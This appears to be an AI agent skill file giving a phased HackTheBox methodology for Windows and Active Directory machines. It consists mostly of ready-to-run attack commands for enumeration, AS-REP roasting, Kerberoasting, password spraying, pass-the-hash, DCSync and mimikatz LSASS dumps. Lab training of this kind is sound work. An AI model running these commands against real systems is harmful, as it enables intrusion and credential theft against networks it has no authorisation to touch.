# SKILL: HackTheBox Windows / Active Directory

## Description
Systematic methodology for Windows-based and AD HackTheBox machines.

## Trigger Phrases
windows, active directory, ad, kerberos, smb, bloodhound, mimikatz

## Methodology

### Phase 1: Reconnaissance
1. Full port scan: `nmap -p- --min-rate 5000 -oN ports.txt <IP>`
2. Service scan: `nmap -sCV -p <ports> -oN services.txt <IP>`
3. Note domain name from LDAP/SMB banners

### Phase 2: Enumeration
1. **SMB**: `crackmapexec smb <IP>`, `smbmap -H <IP>`, `smbclient -L //<IP>`
2. **LDAP**: `ldapsearch -x -H ldap://<IP> -b "DC=domain,DC=local"`
3. **RPC**: `rpcclient -U '' <IP>`, `enumdomusers`, `enumdomgroups`
4. **Kerberos**: `kerbrute userenum --dc <IP> -d <domain> users.txt`
5. **Web**: IIS, ADFS, OWA — check for auth bypass, default creds
6. **DNS**: zone transfer, subdomain enum

### Phase 3: Initial Access
1. AS-REP Roasting: `GetNPUsers.py <domain>/ -dc-ip <IP> -no-pass -usersfile users.txt`
2. Kerberoasting: `GetUserSPNs.py <domain>/<user>:<pass> -dc-ip <IP> -request`
3. Password spraying: `crackmapexec smb <IP> -u users.txt -p passwords.txt`
4. Check for known CVEs (EternalBlue, PrintNightmare, ZeroLogon)
5. If web: exploit web vulnerabilities for initial shell

### Phase 4: Privilege Escalation
1. WinPEAS: `.\winpeas.exe`
2. PowerUp: `Invoke-AllChecks`
3. Check services: unquoted paths, weak permissions
4. Check scheduled tasks, registry autoruns
5. Token impersonation: `whoami /priv` → potato attacks
6. AD: BloodHound → find shortest path to DA

### Phase 5: Lateral Movement & Domain Compromise
1. Pass-the-Hash: `crackmapexec smb <IP> -u <user> -H <hash>`
2. DCSync: `secretsdump.py <domain>/<admin>@<DC-IP>`
3. Golden Ticket, Silver Ticket if needed
4. Dump LSASS: `mimikatz` → `sekurlsa::logonpasswords`
